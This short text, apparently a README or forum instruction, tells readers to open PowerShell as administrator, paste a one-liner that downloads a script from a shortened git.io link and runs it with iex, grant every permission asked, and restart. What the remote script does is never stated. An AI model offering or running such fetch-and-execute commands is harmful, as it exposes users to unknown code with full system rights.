Use this command to execute the script in PowerShell:

# powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://git.io/JTr4a')"

Follow these steps if you do not absolutely know what to do:

1. Copy the above PowerShell script
2. Right click on your Start button and click on Windows Powershell (Admin) on the pop-up
3. Right click on the blinking line and let it do its thing
4. Give permissions and access whenever asked during this process

At the end, you will be required to press a key to restart. Once you've restarted your machine, you should be good to go.
